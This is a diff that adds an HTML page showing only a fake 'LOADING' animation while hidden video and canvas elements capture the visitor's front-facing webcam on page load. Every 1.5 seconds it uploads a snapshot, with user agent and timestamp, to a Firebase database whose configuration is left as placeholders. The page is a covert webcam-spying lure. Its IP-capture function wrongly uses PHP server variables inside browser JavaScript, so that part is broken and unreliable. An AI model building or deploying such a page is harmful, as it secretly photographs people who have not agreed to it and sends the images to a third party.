@@ -1,0 +1,121 @@
+<!doctype html>
+<html>
+
+<head>
+  <title>CAMACK LOADING...</title>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+  <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+  <link rel="stylesheet" href="./css/style.css">
+</head>
+
+<body>
+  <div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+  </div>
+  <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+  <h1>
+    <span>L</span>
+    <span>O</span>
+    <span>A</span>
+    <span>D</span>
+    <span>I</span>
+    <span>N</span>
+    <span>G</span>
+  </h1>
+
+  <script>
+    // Firebase configuration - REPLACE WITH YOUR OWN CONFIG
+    const firebaseConfig = {
+      apiKey: "YOUR_API_KEY",
+      authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
+      databaseURL: "https://YOUR_PROJECT_ID-default-rtdb.firebaseio.com/",
+      projectId: "YOUR_PROJECT_ID",
+      storageBucket: "YOUR_PROJECT_ID.appspot.com",
+      messagingSenderId: "YOUR_SENDER_ID",
+      appId: "YOUR_APP_ID"
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    // Capture IP and user agent info
+    function captureClientInfo() {
+      let ipaddress = "";
+      if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+        ipaddress = $_SERVER['HTTP_CLIENT_IP'];
+      } else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
+      } else {
+        ipaddress = $_SERVER['REMOTE_ADDR'];
+      }
+      
+      return {
+        ip: ipaddress,
+        userAgent: navigator.userAgent,
+        timestamp: new Date().toISOString()
+      };
+    }
+
+    // Send image data to Firebase
+    function sendToFirebase(imgdata) {
+      const timestamp = new Date().getTime();
+      const imageDataRef = database.ref('camack/images/' + timestamp);
+      
+      imageDataRef.set({
+        image: imgdata,
+        metadata: captureClientInfo(),
+        createdAt: firebase.database.ServerValue.TIMESTAMP
+      }).then(() => {
+        console.log("Image data sent to Firebase successfully!");
+      }).catch((error) => {
+        console.error("Error sending data to Firebase: ", error);
+      });
+    }
+
+    // Access webcam
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const constraints = {
+      audio: false,
+      video: {
+        facingMode: "user"
+      }
+    };
+
+    // Access webcam
+    async function init() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        handleSuccess(stream);
+      } catch (e) {
+        console.error(`navigator.getUserMedia error:${e.toString()}`);
+      }
+    }
+
+    // Success handler
+    function handleSuccess(stream) {
+      window.stream = stream;
+      video.srcObject = stream;
+
+      var context = canvas.getContext('2d');
+      setInterval(function() {
+        context.drawImage(video, 0, 0, 640, 480);
+        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+        sendToFirebase(canvasData);
+      }, 1500);
+    }
+
+    // Start initialization
+    init();
+
+    // Utility function for checking empty values
+    function empty(value) {
+      return value === undefined || value === null || value.length === 0;
+    }
+  </script>
+</body>
+
+</html>
